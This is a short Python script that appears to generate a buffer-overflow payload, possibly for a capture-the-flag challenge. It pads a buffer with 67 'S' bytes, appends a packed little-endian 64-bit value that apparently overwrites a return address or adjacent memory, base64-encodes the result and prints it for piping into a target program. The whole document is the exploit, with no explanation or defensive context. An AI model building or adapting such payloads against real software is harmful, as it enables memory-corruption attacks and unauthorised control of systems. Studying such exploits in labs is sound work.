
import sys
import struct
import base64

buf = b'SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS'
buf += struct.pack('<Q', 4329049301023008380)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
